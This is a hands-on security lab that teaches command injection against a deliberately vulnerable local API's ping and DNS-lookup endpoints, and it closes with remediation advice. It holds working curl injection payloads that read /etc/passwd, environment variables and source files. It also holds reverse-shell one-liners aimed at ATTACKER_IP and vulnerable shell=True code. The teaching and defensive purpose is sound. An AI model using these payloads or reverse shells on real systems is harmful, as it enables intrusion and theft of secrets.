# Lab: Command Injection via Tools Endpoints

## Objective

Discover and exploit command injection vulnerabilities in the SocialHack API's tools endpoints (`/tools/ping` and `/tools/dns-lookup`). These endpoints pass user input directly to system commands via `os.popen()` and `subprocess` with `shell=True`, allowing arbitrary command execution on the server.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium-Hard |
| **Estimated Time** | 60 minutes |
| **Prerequisites** | Labs 01–07 completed, basic Linux command knowledge, Python 3 with `requests` |
| **OWASP API Category** | API8:2023 – Security Misconfiguration / Injection |

---

## Background

### What Is Command Injection?

Command injection occurs when user-supplied input is passed to a system shell **without proper sanitization**. If the application constructs system commands by concatenating user input, an attacker can inject additional commands using shell metacharacters.

### Shell Metacharacters for Injection

| Character | Meaning | Example |
|---|---|---|
| `;` | Command separator | `ping 127.0.0.1; whoami` |
| `&&` | AND — run second if first succeeds | `ping 127.0.0.1 && id` |
| `\|\|` | OR — run second if first fails | `ping invalid \|\| id` |
| `\|` | Pipe — feed output to next command | `echo test \| base64` |
| `` ` ` `` | Command substitution (backticks) | `` ping `whoami` `` |
| `$()` | Command substitution | `ping $(whoami)` |
| `\n` / `%0a` | Newline — new command | `ping 127.0.0.1%0awhoami` |

### Vulnerable Code Patterns

```python
# VULNERABLE — os.popen with string concatenation
import os
def ping(host):
    result = os.popen(f"ping -c 1 {host}").read()
    return result

# VULNERABLE — subprocess with shell=True
import subprocess
def dns_lookup(domain):
    result = subprocess.check_output(f"nslookup {domain}", shell=True)
    return result

# SAFE — subprocess with argument list (no shell)
import subprocess
def ping_safe(host):
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
    return result.stdout
```

### Impact of Command Injection

- **Read sensitive files** — `/etc/passwd`, configuration files, environment variables
- **System reconnaissance** — `whoami`, `id`, `uname -a`, `ps aux`
- **Data exfiltration** — Read application source code, database files
- **Reverse shell** — Full remote access to the server (DO NOT attempt in shared labs)
- **Lateral movement** — Access other systems on the network

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5001` |
| Vulnerable Endpoints | `POST /api/v1/tools/ping` (os.popen) |
| | `POST /api/v1/tools/dns-lookup` (subprocess shell=True) |
| Auth Required | Yes (any valid JWT) |

> ⚠️ **WARNING:** This lab is for educational purposes only. Never execute command injection attacks against systems you don't own. Reverse shell examples are conceptual — DO NOT execute them.

---

## Tasks

### Task 1: Test Normal Ping Functionality

**Goal:** Understand how the ping endpoint works with legitimate input.

**Steps:**

1. Login and save the token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Send a normal ping request:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1"}'
```

3. Try pinging localhost:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"localhost"}'
```

4. Note the response format — the output appears to be raw command output, suggesting the input is passed directly to a system command.

<details>
<summary>Hint 1</summary>
The response should show actual <code>ping</code> output with ICMP statistics. This suggests the server is running <code>ping -c 1 &lt;your-input&gt;</code> as a system command.
</details>

<details>
<summary>Hint 2</summary>
If the server returns raw ping output, the input is likely concatenated into a shell command. This means shell metacharacters might be interpreted.
</details>

<details>
<summary>Hint 3</summary>
The server likely runs: <code>os.popen(f"ping -c 1 {host}").read()</code>. The <code>{host}</code> is your input, injected directly into the command.
</details>

---

### Task 2: Command Injection with Semicolon

**Goal:** Execute an arbitrary command by appending it after the ping command using a semicolon separator.

**Steps:**

1. Inject `whoami` after the ping command:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; whoami"}'
```

2. The response should contain **both** the ping output AND the result of `whoami`.

3. Try other injection techniques:

```bash
# Using && (AND)
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1 && whoami"}'

# Using | (pipe)
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1 | whoami"}'

# Using $() command substitution
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"$(whoami)"}'
```

> **🚩 FLAG 1:** What is the output of the `whoami` command?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The semicolon (<code>;</code>) tells the shell to execute the next command after the first one finishes. So <code>ping -c 1 127.0.0.1; whoami</code> runs both commands.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
Look at the response body. After the ping output, you should see a username — likely <code>root</code>, <code>www-data</code>, or the process user.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The output will be the username running the Flask process. Common values: <code>root</code> (if running as root in Docker), <code>www-data</code>, or your system username. Check the last line of the response.
</details>

---

### Task 3: Read System Files

**Goal:** Use command injection to read sensitive files from the server's filesystem.

**Steps:**

1. Read `/etc/passwd`:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; cat /etc/passwd"}'
```

2. Read the first few lines only:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; head -5 /etc/passwd"}'
```

3. Try reading environment variables (may contain secrets):

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; env"}'
```

4. Check for configuration files:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; cat /etc/hostname"}'
```

> **🚩 FLAG 2:** What is the first line of `/etc/passwd`?

<details>
<summary>Hint 1</summary>
The <code>/etc/passwd</code> file lists all system users. The first line is always the <code>root</code> user entry.
</details>

<details>
<summary>Hint 2</summary>
The standard first line format is: <code>root:x:0:0:root:/root:/bin/bash</code> (or <code>/bin/sh</code> on minimal systems).
</details>

<details>
<summary>Hint 3</summary>
The first line is: <code>root:x:0:0:root:/root:/bin/bash</code> (or a similar variant depending on the OS). It shows the root user with UID 0 and GID 0.
</details>

---

### Task 4: Directory Listing and Exploration

**Goal:** Explore the server's filesystem to understand the application structure.

**Steps:**

1. List the root directory:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; ls -la /"}'
```

2. Find the application directory:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; ls -la /app"}'
```

3. Read the current working directory:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; pwd"}'
```

4. Find Python files (application source code):

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"host":"127.0.0.1; find . -name \"*.py\" -type f 2>/dev/null | head -20"}'
```

> **🚩 FLAG 3:** What is the current working directory (`pwd`)?

<details>
<summary>Hint 1</summary>
The <code>pwd</code> command prints the current working directory. Append it after a semicolon in your injection.
</details>

<details>
<summary>Hint 2</summary>
The working directory is where the Flask application is running from. Common locations: <code>/app</code>, <code>/home/user/app</code>, or the project directory.
</details>

<details>
<summary>Hint 3</summary>
Use <code>{"host":"127.0.0.1; pwd"}</code> and look for the directory path in the response. It's likely <code>/app</code> or the project directory path.
</details>

---

### Task 5: DNS-Lookup Command Injection

**Goal:** Test the second vulnerable endpoint (`/tools/dns-lookup`) which uses `subprocess` with `shell=True`.

**Steps:**

1. Test normal dns-lookup:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/dns-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"domain":"example.com"}'
```

2. Inject `id` command:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/dns-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"domain":"x; id"}'
```

3. Get system information:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/dns-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"domain":"x; uname -a"}'
```

4. List network interfaces:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/dns-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"domain":"x; ifconfig 2>/dev/null || ip addr"}'
```

5. Read the application's source code (if accessible):

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/dns-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"domain":"x; cat run.py 2>/dev/null || echo not found"}'
```

<details>
<summary>Hint 1</summary>
The dns-lookup endpoint uses <code>subprocess.check_output(f"nslookup {domain}", shell=True)</code>. The <code>shell=True</code> flag means shell metacharacters are interpreted.
</details>

<details>
<summary>Hint 2</summary>
Use <code>{"domain":"x; id"}</code> — the <code>x</code> will cause the nslookup to fail, but the <code>id</code> command after the semicolon will still execute.
</details>

<details>
<summary>Hint 3</summary>
The <code>id</code> output shows the user ID, group ID, and supplementary groups. Look for something like <code>uid=0(root) gid=0(root)</code> or similar.
</details>

---

### Task 6: Reverse Shell Concepts (Educational Only)

**Goal:** Understand how command injection could lead to a reverse shell. **DO NOT EXECUTE** — this is for conceptual understanding only.

**Explanation:**

A reverse shell is when the target server connects back to the attacker's machine, giving the attacker interactive shell access. Here's how it would theoretically work:

```
┌────────────┐                          ┌────────────┐
│  Attacker   │◀─── TCP Connection ─────│   Target   │
│  (listener) │                          │  (server)  │
│  nc -lvp    │                          │  /bin/bash │
│    4444     │────── Commands ─────────▶│            │
│             │◀────── Output ──────────│            │
└────────────┘                          └────────────┘
```

**Theoretical payloads (DO NOT RUN):**

```bash
# Bash reverse shell (EDUCATIONAL ONLY — DO NOT EXECUTE)
# {"host":"127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}

# Python reverse shell (EDUCATIONAL ONLY — DO NOT EXECUTE)
# {"host":"127.0.0.1; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"}

# Netcat reverse shell (EDUCATIONAL ONLY — DO NOT EXECUTE)
# {"host":"127.0.0.1; nc ATTACKER_IP 4444 -e /bin/sh"}
```

**Why this is critical:**
- An attacker with a reverse shell has full server access
- They can read all files, access databases, pivot to other systems
- All from a simple API input that wasn't sanitized

<details>
<summary>Hint 1</summary>
Reverse shells are the "end game" for command injection. They provide persistent, interactive access to the compromised server.
</details>

<details>
<summary>Hint 2</summary>
In a real assessment, you would <strong>never</strong> execute a reverse shell without explicit written authorization. In a CTF or isolated lab environment, you might use it to demonstrate full compromise.
</details>

<details>
<summary>Hint 3</summary>
The key defense against reverse shells is preventing command injection in the first place. Input validation, parameterized commands, and network egress filtering are all important controls.
</details>

---

## Flags Summary

| Flag | Description | Expected Value |
|---|---|---|
| FLAG 1 | Output of `whoami` command | Server process username (e.g., `root` or user) |
| FLAG 2 | First line of `/etc/passwd` | `root:x:0:0:root:/root:/bin/bash` (or similar) |
| FLAG 3 | Current working directory (`pwd`) | Application directory path |

---

## Remediation

### 1. Never Use Shell Commands with User Input

```python
# VULNERABLE
os.popen(f"ping -c 1 {host}")
subprocess.check_output(f"nslookup {domain}", shell=True)

# SAFE — use argument list, no shell
subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
subprocess.run(["nslookup", domain], capture_output=True, text=True)
```

### 2. Use Python Libraries Instead of Shell Commands

```python
# Instead of os.popen("ping ..."), use:
import ping3
result = ping3.ping(host)

# Instead of subprocess("nslookup ..."), use:
import dns.resolver
answers = dns.resolver.resolve(domain, "A")
```

### 3. Strict Input Validation

```python
import re

def validate_host(host):
    # Only allow IP addresses and valid domain names
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'

    if not (re.match(ip_pattern, host) or re.match(domain_pattern, host)):
        abort(400, "Invalid host format")

    # Block dangerous characters
    dangerous = [';', '&', '|', '`', '$', '(', ')', '{', '}', '\n', '\r']
    if any(c in host for c in dangerous):
        abort(400, "Invalid characters in host")

    return host
```

### 4. Use Allowlists

```python
ALLOWED_HOSTS = ["127.0.0.1", "localhost", "example.com"]

def ping(host):
    if host not in ALLOWED_HOSTS:
        return jsonify({"error": "Host not allowed"}), 403
```

### 5. Run with Minimal Privileges

```dockerfile
# Run the application as a non-root user
RUN useradd -m appuser
USER appuser
```

### 6. Network Egress Filtering

- Block outbound connections from the API server
- Only allow traffic to known, required destinations
- This prevents reverse shells from connecting back

---

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
